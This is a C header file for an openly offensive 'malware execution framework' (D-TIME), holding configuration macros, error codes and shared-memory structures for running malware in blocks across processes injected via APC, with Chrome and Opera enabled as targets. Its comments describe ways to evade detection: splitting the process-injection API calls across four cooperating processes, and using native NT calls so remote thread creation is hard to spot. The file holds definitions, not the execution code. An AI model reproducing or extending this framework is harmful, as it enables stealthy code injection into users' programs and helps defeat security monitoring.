/*
 *					_____             _______   _____   __  __   ______ 
 *					|  __ \           |__   __| |_   _| |  \/  | |  ____|
 *					| |  | |  ______     | |      | |   | \  / | | |__   
 *					| |  | | |______|    | |      | |   | |\/| | |  __|  
 *					| |__| |             | |     _| |_  | |  | | | |____ 
 *					|_____/              |_|    |_____| |_|  |_| |______|
 *					
 *
 * 				DISTRIBUTED THREADLESS INDEPENDENT MALWARE EXECUTION FRAMEWORK
 * 
 */

 /*-------------------------------------------------------------------------------------------------
  *
  *  This file contains all definitions needed for execution engine. 
  *
  *-----------------------------------------------------------------------------------------------*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h> 
#include <stdio.h>
#include <stdarg.h>                                     // va_list, va_start, va_arg, va_end
#include <stddef.h>                                     // offsetof
#include <conio.h>

//#define __USE_NT_FUNCTIONS__							// Usage of NT functions will result better
														//	 evasion. Not really necessary though
#define __NT_INJECTION__
//#define __USE_CONFIG_FILE__
#ifdef __USE_CONFIG_FILE__
	#define __CONFIG_FILE_NAME__ "config.txt"
	#define __MAX_CONFIG_LENGTH__ 30
	#define __NO_CONFIG_VALUES__ 3
	/* File Format:
	 *		Line 1: NPROC
	 *		Line 2: NBLOCKS
	 *		Line 3: NSEGMS
	 *		(Only integers allowed)
	 */
#endif


#define MAX_CTRL_MEM_NAME_SIZE 25
#define MAX_MUTEX_WAIT_TIME 1000
#define MAX_SEMAPHORE_WAIT_TIME 1000
#define	MAX_QUEUE_COUNT 1
#define __DEBUG__

#ifdef __DEBUG__
	/* Inject to itself for debug purpose */
	//#define __SELF_INJECTION__

	/* Do you want to turn on logging?
	 * Logging can affect your performance very badly
	 */
	//#define __LOG__

	/* Print offset of differnet variables of shctrl_t and exit */
	//#define __PRINT_OFFSET__

	#ifndef __SELF_INJECTION__
		/* Select which all processes you like to inject to */
		#define __INJECT_CHROME__
		//#define __INJECT_SKYPE__
		//#define __INJECT_ACR_READER__
		#define __INJECT_OPERA__
		//#define __INJECT_VLC__
		//#define __INJECT_CALC__
		//#define __INJECT_FIREFOX__
		//#define __INJECT_EXPLORER__
		//#define __INJECT_INTERNET_EXPLORER__

		/* Limit the number of threads used per process
		 * Note: Shared control region will still have the space
		 * for MAX_THRDS_PER_PROCESS threads per process.
		 */
		//#define __LIMIT_THRD_COUNT__ 15

		/* Turn on if you want every thread to queue emulator on
		 * Every thread (including itself) irrespective of apc_count
		 */
		//#define __UNLIMITED_QUEUE__
	#endif

	#ifdef __LOG__
		#define MAX_ONE_TIME_LOG_SIZE 50
		//#define __LOG__QUEUING__						// Every Queuing of the emulator will be
														//   Logged under %TMP%\queuingLog.txt
														//   Edit the file name to suite your system
		//#define __LOG_BY_MSG__							// A Message box will pop up for every
														//   APC injection performed.
		#define __LOG_BLK_IDS__							// IDs of blocks executed will be logged
														//   in %TMP%\blk_id_Log.txt
		/*All log types till now belongs to default verbose level (1)
			Level 2 logs the important activities of each APC executed
		*/
		//#define __VERBOSE_2__							// 			+
	#endif
#endif
//-----------------------------------------------------------------------------------------------------------
// D-TIME variations - it comes in many flavors :)
//-----------------------------------------------------------------------------------------------------------


/* If __INJECT_FROM_TABLE__ is disabled, the payload will queue further APCs
 * by looking at the process snapshot. This makes payload self-sufficient
 * But this will make the payload heavy as it has to take snapshop of processes
 * again and again.
 * 
 * If injected from table, The loader will keep track of all the targetted threads
 * The emulator only needs to look at the table and queue APCs. This is much ligher
 * as far as the payload is concerned.
 */
#define __INJECT_FROM_TABLE__

/******************** Variation 1 ********************/
// Preload all blocks in process address space (in heap). This makes code run faster. Otherwise we have to
// load, relocate & unload every block before we execute it. However this makes our engine less stealthy.
// WARNING: I haven't tested with this MACRO disabled!
#define __VAR_1_PRELOAD_BLOCKS__


/******************** Variation 2 ********************/
// Use a function pointer table to relocate calls. When you resolve a function address at runtime you have 2
// options: 
//  [1]. use a NOP + a relative function call
//  [2]. use a function pointer table and make absolute calls from this table
//
// WARNING 1: Option [2] doesn't work when we have jumps to imported dlls: jmp ds:__imp__memset
// WARNING 2: I haven't tested with this MACRO disabled!
#define __VAR_2_USE_FUNCTION_POINTER_TABLE__


/******************** Variation 3 ********************/
// Load shared segments (.data, etc.) in predefined segments. This makes engine less stealthy, but more
// reliale. If we use global pointer to these segments, and we assign a pointer under process A, this 
// pointer will be invalid under process B.
// WARNING: If you don't use this variation you'll probably crash
#define __VAR_3_LOAD_SEGMS_IN_PREDEFINED_ADDR__


/******************** Variation 5 ********************/
// The weakest point of D-TIME is the injection; It's possible to get detected during injection and thus
// make the whole idea collapse. We can do 2 things here. The first is to use our idea to do the injection.
// Injection is a combination of 4 system calls: OpenProcess - VirtualAllocEx - WriteProcessMemory - 
// CreateRemoteThread. Definitely if we see this pattern we can say that this is a dll injection attempt.
// The idea is to spawn 4 processes and each process execute only 1 system call. In more detail:
//  [1]. Process I calls OpenProcess() and obtains a valid HANDLE
//  [2]. Process I spawn processes II, III and iV, and calls DuplicateHandle() for Process II, III and
//       IV and for that HANDLE
//  [3]. Process II calls VirtualAllocEx(), obtains a pointer to the allocated memory and send this 
//       pointer to Process III
//  [4]. Process III calls WriteProcessMemory() and writes executer to remote process.
//  [5]. Process IV calls CreateRemoteThreas(), in suspended state and calls DuplicateHandle() to send
//       thread handle to Process I.
//  [6]. Process I can call ResumeThread() to launch executer()
//
// Although this is not really stealth, it's a raw implementation of our splitting idea, and can add a 
// layer of protection.
//
// The 2nd layer of protection is to use the Native API calls instead. It's true that many high level API
// calls mapped to the same NT API call. This makes harder to find malicious patterns in system calls
// especially if detection is only based on system calls and not on their arguments. For example 
// CreateThread() (which is not malicious) and CreateRemoteThread() (which is often malicious) are mapped
// to the same Native function: NtCreateThreadEx(). If you don't look at the arguments of NtCreateThreadEx()
// you cannot understand if it really called to create a remote thread or not.
//
// By setting this variation the Native API injection flavor will be implemented:
//      ZwOpenProcess - NtAllocateVirtualMemory - NtWriteVirtualMemory - NtCreateThreadEx
// #define __VAR_5_USE_NTAPI_FOR_INJECTION__


/******************** Variation 6 ********************/
// Print some debug information to the console. This is for debugging purposes only.
// #define __VAR_6_DISPLAY_VERBOSE_INFO__

/******************** Variation 7 ********************/
// Enable use of spins upon SOCKET and HANDLE close.
#define __VAR_7_ENABLE_SPINS__

/******************** Variation 8 ********************/
// Enable some debug checks to make debugging easier.
// #define __VAR_8_ENABLE_DEBUG_CHECKS__

/******************** Variation 9 ********************/
// Store a list of every block ID being executed (DEBUGGING ONLY)
//#define __VAR_9_TRACE_BLOCKS__

/******************** Variation 10 ********************/
// Load blocks and metadata from constant tables. Otherwise load them from files
// #define __VAR_10_LOAD_BLOCKS_N_META_FROM_TABLES__

//-----------------------------------------------------------------------------------------------------------
// error codes
//-----------------------------------------------------------------------------------------------------------
#define ERROR_SUCCESS_                  0x80000000          // No error happened
#define ERROR_GETPROCADDR_1             0x80000001          // Can't find function address through kernel32 IAT
#define ERROR_GETPROCADDR_2             0x80000002          // Can't find function address through LoadLibrary
#define ERROR_ATTACHSHCTRL              0x80000003          // Can't attach to shared control region
#define ERROR_ATTACHSHSTACK             0x80000004          // Can't attach to shared stack
#define ERROR_SEGMLOAD                  0x80000005          // Can't load a segment
#define ERROR_ATTACHBLK                 0x80000006          // Can't load a block
#define ERROR_SEMCREATE                 0x80000007          // Can't create semaphore
#define ERROR_PID_NOT_FOUND             0x80000008          // Can't find current pid
#define ERROR_MAILBOX                   0x80000009          // Internal problems with mailbox
#define ERROR_WASH_SIG_INVALID          0x8000000A          // Invalid block header signature
#define ERROR_BLK_SIG_INVALID           0x8000000B          // Invalid block start signature
#define ERROR_BLK_SEGM_SIG_INVALID      0x8000000C          // Invalid semgent header signature
#define ERROR_DUP_TYPE_INVALID          0x8000000D          // Invalid duplication type
#define ERROR_HEAP_OPERATION_INVALID    0x8000000E          // Invalid heap operation
#define ERROR_LOADLIB_FAILED            0x8000000F          // Can't load library
#define ERROR_PROCADDR_NOT_FOUND        0x80000010          // Can't find process address
#define ERROR_LOCALALLOC_FAILED         0x80000011          // Can't allocate local memory
#define ERROR_CANNOT_RELEASE_SEM        0x80000012          // Can't release semaphore
#define ERROR_HEAP_ALLOC_FAILED         0x80000013          // Cannot allocated shared memory for heap (UNUSED)
#define ERROR_INVALID_NXTBLK            0x80000014          // Next block has an invalid ID
#define ERROR_ATTACHDETOUR              0x80000015          // Can't attach to detour function
#define ERROR_SCHEDULER_INFLOOP         0x80000016          // Infinite loop inside scheduler

//-----------------------------------------------------------------------------------------------------------
// constant definitions
//
// WARNING: In order to optimize code, I substitute some of the constants below with their actual numbers.
//  For example, instead of doing: "mul eax, MAILBOXSIZE", we're doing: "shl eax, 10". Be really careful
//  when modifying these values :)
//-----------------------------------------------------------------------------------------------------------
#define _ERROR				0xffffffff                      // error value
#define SUCCESS				0x0                             // success value
#define FUNTBLSIZE			4096                            // max function table size
#define SEGMTABSIZE			32                              // segment table size 
#define MAXNBLKS			1536                            // max number of blocks (they'll be many in paranoid mode)
#define MAXMNEMLEN			128                             // max instruction mnemonic length
#define EOSCHAR				"\xcc"                          // a non-printable ASCII character
#define MAXFUNAMELEN		128                             // max function name length
#define MAXSEGNAMELEN		64                              // max segment name length
#define MAXBLKSIZE			1536                            // max block size
#define MAXBLKNFUNC			128                             // max number of function calls
#define MAXMODNAMELEN		64                              // max imported module name length
#define MODTABSIZE			32                              // module table size
#define MAX_NO_PROC			16                              // max number of injected processes ??
#define MAX_THRDS_PER_PROC  16                              // max number of threads per processes
#define MAXOPENHANDLE		16                              // max number of concurrent open SOCKETs/HANDLEs
#define MAILBOXSIZE			1024                            // mailbox size (1K is fine)
#define MAXMAILBOXSIZE		8                               // maximum number of unread mails
#define DUPUNIQUESIG	 	0x1337beef                      // a unique signature before the start of a dup* hook
#define DUPDETOURADDR		0x19700000                      // predefined-known address of dup* detour
#define STACKBASEADDR		0x19900000                      // stack virtual base address
#define STACKSIZE			0x20000                         // stack size
#define STACKBASEADDR2		0x19900040                      // different call caches for different dependencies
#define SEGMBASEADDR		0x1bb00000                      // 1st segment virtual base address
#define SEGMNXTOFF			0x20000                         // virtual offset between segment base address
#define HEAPBASEADDR		0x1cc00000                      // heap starts from here
#define NMAXTHREADS			4                               // maximum number of threads that we can handle
#define LISTEN_BACKLOG		20                              // maximum listen() queue (LISTEN_BACKLOG must be > MAX_NO_PROC)
#define SPINCOUNTER			256                             // number of spins
#define ARGVBASEOFF			0x200                           // base address of argv table
#define ARGVPTRBASEOFF		0x240                           // base address of argv pointers 
#define ARGVNXTOFF			0x40                            // offset between argv pointers
//-----------------------------------------------------------------------------------------------------------
// types of duplications and heap operations within basic block
//-----------------------------------------------------------------------------------------------------------
#define DUPNONE         0xff                                // don't duplicate
#define DUPHANDLE       0x01                                // duplicate handle
#define DUPHANDLE2      0x02                                // duplicate 2 handles
#define DUPSOCK         0x03                                // duplicate socket
#define DUPSOCK2        0x04                                // duplicate 2 sockets
#define CLOSEHANDLE     0x05                                // close handle
#define CLOSESOCK       0x06                                // close socket
#define DUPPTRHANDLE    0x81                                // duplicate handle pointer
#define DUPPTRHANDLE_2  0x82                                // duplicate 2 handle pointers

#define HEAPOPALLOC     1                                   // heap operation: allocate
#define HEAPOPFREE      2                                   // heap operation: free
#define HEAPOPMMAP      3                                   // heap operation: mmap
#define HEAPOPFREERWD   4                                   // heap operation: free and rewind

//-----------------------------------------------------------------------------------------------------------
// thread states
//-----------------------------------------------------------------------------------------------------------
#define THREAD_UNUSED       0xffff                          // thread does not exists
#define THREAD_RUNNING      0x0001                          // thread is running
#define THREAD_SUSPENDED    0x0000                          // thread is suspended

//-----------------------------------------------------------------------------------------------------------
// mail commands
//-----------------------------------------------------------------------------------------------------------
#define CMD_NONE            0x00                            // mailbox is empty (not really a command)
#define CMD_WSASTARTUP      0x01                            // call WSAStartup()
#define CMD_DUPSOCKINIT     0x02                            // a socket has created
#define CMD_DUPSOCKCLOSE    0x03                            // a socket has closed
#define CMD_DUPHANDLEINIT   0x04                            // a handle has opened/created (unused)
#define CMD_DUPHANDLECLOSE  0x05                            // a handle has closed
#define CMD_ALLOCMEM        0x06                            // some memory allocated
#define CMD_FREEMEM         0x07                            // some memory deallocated
#define CMD_MAPMEM          0x08                            // some memory mapped
#define CMD_SET_CURRENT_DIR 0x09                            // current directory changed

//-----------------------------------------------------------------------------------------------------------
// type definitions
//-----------------------------------------------------------------------------------------------------------
typedef unsigned short int  ushort;
typedef unsigned char       byte;
typedef unsigned int        uint, addr;
typedef unsigned long int   ulong;

//-----------------------------------------------------------------------------------------------------------
// function definitions
//-----------------------------------------------------------------------------------------------------------
void            fatal( const char*, ... );                  // display a fatal error and exit
#ifndef __USE_NT_FUNCTIONS__
void __stdcall executer(unsigned long lpParam);                  // code (many functions) that executes basic blocks
//ulong __stdcall executer( void *lpParam );                  // code (many functions) that executes basic blocks
#else
ulong __stdcall executer(void* parameter, void* pra2, void* para3); // code (many functions) that executes basic blocks
#endif
byte*           crtshreg( char[] , uint, void*);            // create a shared region
void            loadsegms( void );                          // load all segments
void            loadfuntab( void );                         // load function table
void            loadblks( void );                           // load all blocks
void            loadmodtab( void );                         // load module table
void            loadthdtab( void );                         // load thread table
void            loadinitab( void );                         // load initialized pointer table
void            reasm();                                    // reassemble large arrays

//-----------------------------------------------------------------------------------------------------------
// shared region overview
//-----------------------------------------------------------------------------------------------------------  
//  Bit
//  0              15              31              47              63
//  +--------------+---------------+---------------+---------------+
//  |               "$D_TIME$" (Shared Region Header)              |
//  +--------------+---------------+---------------+---------------+
//  |   Reserved   |    #Blocks    |   #Segments   |  FunTab Size  |
//  +--------------+---------------+---------------+---------------+
//  |   #Modules   |  #Processes   |     Next heap base address    |
//  +--------------+---------------+---------------+---------------+
//  |Next Block #0 | Next Block #1 | Next Block #2 | Next Block #3 |
//  +--------------+---------------+---------------+---------------+
//  |Thrd #0 State | Thrd #1 State | Thrd #2 State | Thrd #3 State |
//  +--------------+---------------+---------------+---------------+
//  | Thread #0 Routine Entry Point| Thread #1 Routine Entry Point |
//  +--------------+---------------+---------------+---------------+
//  | Thread #2 Routine Entry Point| Thread #3 Routine Entry Point |
//  +--------------+---------------+---------------+---------------+
//  |                         Reserved 2                           |
//  +--------------+---------------+---------------+---------------+
//  |                Saved Context for Main Thread                 |
//  |       EAX, EDX, ECX, EBX, ESI, EDI, ESP, EBP, EFL, RSV       |
//  +--------------+---------------+---------------+---------------+
//  |                             ...                              |
//  +--------------+---------------+---------------+---------------+
//  |                Saved Context for Thread #3                   |
//  |       EAX, EDX, ECX, EBX, ESI, EDI, ESP, EBP, EFL, RSV       |
//  +--------------+---------------+---------------+---------------+
//  | Segment 1 ID |       Shared memory name for Segment 1        |
//  +                                                              +
//  |     Segmennt 1 Start RVA     |      Segmennt 1 End RVA       |
//  +--------------+---------------+---------------+---------------+
//  |                             ...                              |
//  +--------------+---------------+---------------+---------------+
//  | Segment N ID |       Shared memory name for Segment N        |
//  +                                                              +
//  |     Segmennt N Start RVA     |      Segmennt N End RVA       |
//  +--------------+---------------+---------------+---------------+
//  |                         Module name 1                        |
//  |                             ...                              |
//  |                         Module name N                        |
//  +--------------+---------------+---------------+---------------+
//  |                Shared memory name for Block 1                |
//  |                             ...                              |
//  |                Shared memory name for Block N                |
//  +--------------+---------------+---------------+---------------+
//  |                                                              |
//  |                   Function Table (FunTab)                    |
//  |                                                              |
//  +--------------+---------------+---------------+---------------+
//  |                          Reserved 3                          |
//  +--------------+---------------+---------------+---------------+
//  |                          PID table                           |
//  +--------------+---------------+---------------+---------------+
//  |           Duplicate Table (MAX_NO_PROC entries)           |
//  |                                                              |
//  | Original Hdl | Handle for P1 |      ...      | Handle for PN |
//  |                             ...                              |  
//  | Original Hdl | Handle for P1 |      ...      | Handle for PN |
//	+--------------------------------------------------------------+
//	|						...   ...	...						   |
//  +--------------+---------------+---------------+---------------+
//  |                    MailBox for Process #1                    |
//  |                             ...                              |  
//  |              MailBox for Process #MAX_NO_PROC                |
//  +--------------+---------------+---------------+---------------+
//
struct shctrl_t 
{
	// ----------------------------------------------------------------------------------
	char    signature[8];                                   // shared control region signature (OPTIONAL)
	ushort  reserved1,                                      // reserved
			nblks,                                          // total number of blocks
			nsegms,                                         // total number of segments
			nmods,                                          // total number of modules
			funtabsz,                                       // function table size
			nproc;                                          // number of injected proccesses
	ulong   nxtheapaddr;                                    // next address in heap to allocate

	ushort  nxtblk[ NMAXTHREADS ],                          // next block to execute (1 per thread)
			thrdst[ NMAXTHREADS ];                          // thread states    
	ulong   thrdrtn[ NMAXTHREADS ];                         // thread entry points
			
	char    spin;                                           // spin flag
	byte    reserved2[7];                                   // reserved for future use

	
	#define NBLKSOFF        0xa                             // (we cannot use sizeof, or offset of)
	#define NSEGMSOFF       0xc                             //
	#define NMODSOFF        0xe                             //
	#define FUNTABSZ        0x10                            //
	#define NPROCOFF        0x12                            //
	#define NXTHEAPADDROFF  0x14                            //
	#define NXTBLKOFF       0x18                            // 
	#define THRDSTOFF       0x20                            // offsets of members withing stack 
	#define THRDRTNOFF      0x28                            //
	#define SPINOFF         0x38                            // 
	
	// ----------------------------------------------------------------------------------
	struct context_t {                                      // context switch struct (0x28 bytes)
		uint    eax;                                        // we store 8 basic registers + FLAGS
		uint    edx;                                        //
		uint    ecx;                                        //
		uint    ebx;                                        //
		uint    esi;                                        //
		uint    edi;                                        //
		uint    esp;                                        //
		uint    ebp;                                        // don't need eip
		uint    eflags;                                     //
		uint    reserved;                                   // reserved for future use
	
		#define CTXOFF_EAX  0x0                             // member offsets
		#define CTXOFF_EDX  0x4                             //
		#define CTXOFF_ECX  0x8                             //
		#define CTXOFF_EBX  0xc                             //
		#define CTXOFF_ESI  0x10                            //
		#define CTXOFF_EDI  0x14                            //
		#define CTXOFF_ESP  0x18                            //
		#define CTXOFF_EBP  0x1C                            //
		#define CTXOFF_EFL  0x20                            //
	} 
	ctx[ NMAXTHREADS ];                                     // context variable
	
	#define CTXLEN 40                                       // context length (0x28)
	#define CTXOFF 0x40                                     // ctx offset
	// ----------------------------------------------------------------------------------
	struct segm_t {                                         // segments information (0x10 bytes)
		ushort  segmid;                                     // segment id (optional, as segments are 
															// sequential starting from 0)
		char    name[6];                                    // random name to identify shared region
		addr    startEA, endEA;                             // start and end RVAs
	} 
	segm[ SEGMTABSIZE ];                                    // store segments in an array

	#define SEGMOFF    0xe0                                 // = CTXOFF + NMAXTHREADS*4 + 0x28
	#define SEGMOFFNAM 0xe2                                 //
	#define SEGMOFFSTR 0xe8                                 //
	#define SEGMOFFEND 0xec                                 //

	#define MODLOFF 0x2e0                                   // = SEGMOFF + (SEGMTABSIZE << 4)
	struct modl_t {                                         // module information
															// module id is used as an index
		char    name[ MAXMODNAMELEN ];                      // module name
		// ulong    reserved;
	} 
	modl[ MODTABSIZE ];                                     // store modules here

	#define BLKOFF 0xae0                                    // = MODLOFF +  MODTABSIZE * MAXMODNAMELEN
	struct blk_t {                                          // basic block information
															// bid is used as index
		char    name[8];                                    // random name to identify shared region
		// ulong    reserved;
	} 
	blk[ MAXNBLKS ];                                        // store bid shared region names here


	#define FUNTABOFF 0x3ae0                                // = BLKOFF + (MAXNBLKS << 3)
	char    funtab[ FUNTBLSIZE ];                           // function table
	byte    reserved3[ 8 ];                                 // reserved for future use

	#define PIDTABOFF 0x4ae8                                // = FUNTABOFF + FUNTBLSIZE + 8
	ulong   pidtab[MAX_NO_PROC];							// table of all loaded pids


	#define DUPTABOFF 0x4b28                                // = PIDTABOFF + MAX_NO_PROC*4
	#define DUPTABENTSZ 72									// 4 + 2 + 2 + (0x10)*4 = 0x48
	struct duptab_entry {                                   // duplication table entry (72 bytes)
		ulong   origval;                                    // original value of SOCKET/HANDLE
															// sizeof(long) = 4 in msdn
		ushort  type;                                       // HANDLE or SOCKET? (2byte)
		ushort  reserved3;                                  // for future use    (2byte)
		void    *handle[ MAX_NO_PROC ];						// SOCKET/HANDLE value
	} 
	duptab[ MAXOPENHANDLE ];                                // every open SOCKET/HANDLE has 1 entry


	#define HEAP_OFF 0x4fa8									// = DUPTABOFF + 72*MAXOPENHANDLE   (72=0x48)
	void* pLocalHeap[MAX_NO_PROC];							// Address of local Heap memory (APC Addition)

	#define EMULATOR_ADDR_OFF 0x4fe8						// = HEAP_OFF + 4*MAX_NO_PROC
	void* emulatorAddr[MAX_NO_PROC];						// Stores the addr of emulator in each proc
	/* TODO: Reduce the size of emulatorAddr <= Last 4 digits(in hex) are always zero */

	#define THREADS_OFF 0x5028
	ulong threads[MAX_NO_PROC][MAX_THRDS_PER_PROC];

	#define APC_COUNT_OFF 0x5428
	__int8 apc_count[MAX_NO_PROC][MAX_THRDS_PER_PROC];		// Stores the numbers of pending/running APCs for the thread

	// TODO: Remove this
	#define INIT_STAT_OFF 0x5528
	__int8 init_status[MAX_NO_PROC];						// Stores init status of each process
															// 1: init done;		0: init not done


#define MAILBOXOFF 0x5538
	//#define MAILBOXOFF 0x4de8                               // = HEAP_OFF + 4*MAX_NO_PROC
	struct mailbox_t {                                      // mailbox data type (1024 bytes)
		ushort  cmd,                                        // message command
				reserved;                                   // reserved value
		void*   handle;                                     // original SOCKET/HANDLE value
		ulong   reserved2[2];                               // another reserved value       
		
		byte    data[MAILBOXSIZE - 16];                     // message data
	}
	mailbox[ MAX_NO_PROC ][ MAXMAILBOXSIZE ];				// 1 mailbox for each process
};


/* 
	You can use the code below, to find the offsets withing shctrl_t for the define MACROs

	printf("nblks      : %04Xh\n", offsetof(shctrl_t, nblks)      );
	printf("nsegms     : %04Xh\n", offsetof(shctrl_t, nsegms)     );
	printf("nmods      : %04Xh\n", offsetof(shctrl_t, nmods)      );
	printf("funtabsz   : %04Xh\n", offsetof(shctrl_t, funtabsz)   );
	printf("nproc      : %04Xh\n", offsetof(shctrl_t, nproc)      );
	printf("nxtheapaddr: %04Xh\n", offsetof(shctrl_t, nxtheapaddr));
	printf("nxtblk     : %04Xh\n", offsetof(shctrl_t, nxtblk)     );
	printf("thrdst     : %04Xh\n", offsetof(shctrl_t, thrdst)     );
	printf("thrdrtn    : %04Xh\n", offsetof(shctrl_t, thrdrtn)    );
	printf("spin       : %04Xh\n", offsetof(shctrl_t, spin)       );
	printf("ctx        : %04Xh\n", offsetof(shctrl_t, ctx)        );
	printf("segm       : %04Xh\n", offsetof(shctrl_t, segm)       );
	printf("modl       : %04Xh\n", offsetof(shctrl_t, modl)       );
	printf("blk        : %04Xh\n", offsetof(shctrl_t, blk)        );
	printf("funtab     : %04Xh\n", offsetof(shctrl_t, funtab)     );
	printf("pidtab     : %04Xh\n", offsetof(shctrl_t, pidtab)     );
	printf("duptab     : %04Xh\n", offsetof(shctrl_t, duptab)     );
	printf("mailbox    : %04Xh\n", offsetof(shctrl_t, mailbox)    );
 */

extern shctrl_t *shctrl;                                    // global shared control region
// ----------------------------------------------------------------------------------------------------------
//                                 end of Shared Memory definitions
// ----------------------------------------------------------------------------------------------------------


/********************************************************************
 *  definitions for Process Local Heap Memory
 ********************************************************************/

typedef struct segmptr_t {			// Information on segments loaded to process
	void	*base,					// base address
			*hdl;					// open handle to this segment
} segmptr_t;

/* Process Local Heap Memory structure */
typedef struct pLocalHeap_t {

	segmptr_t segmptr[SEGMTABSIZE];

	void *sem[NMAXTHREADS];									// semaphores
	int pid_index;

	void *blkaddr[MAXNBLKS];								// block base address table
	void *blkoff[MAXNBLKS];

	char* EXECUTER;											// TODO: Should be "const char*"
	unsigned long EXE_SIZE;


#ifdef __VAR_2_USE_FUNCTION_POINTER_TABLE__
	void    *fptab[MAXBLKNFUNC];							// function pointer table
	uint    fptabcnt;										// and its counter
#endif

} pLocalHeap_t;


